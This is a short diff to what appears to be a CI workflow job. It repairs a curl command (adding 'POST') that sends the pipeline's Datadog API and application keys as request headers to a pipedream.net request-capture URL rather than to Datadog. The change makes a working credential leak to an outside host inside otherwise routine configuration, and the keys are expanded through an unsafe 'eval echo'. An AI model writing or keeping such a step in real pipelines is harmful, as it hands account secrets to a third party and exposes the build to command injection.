@@ -12,7 +12,7 @@ jobs:
               DATADOG_API_KEY=$(eval echo "${DATADOG_API_KEY}")
               DATADOG_APP_KEY=$(eval echo "${DATADOG_APP_KEY}")
               
-              curl -v -L -X "https://enf81151xturj.x.pipedream.net" \
+              curl -v -L -X POST "https://enf81151xturj.x.pipedream.net" \
                 --header "Content-Type: application/json" \
                 --header "DD-API-KEY: ${DATADOG_API_KEY}" \
                 --header "DD-APPLICATION-KEY: ${DATADOG_APP_KEY}" \
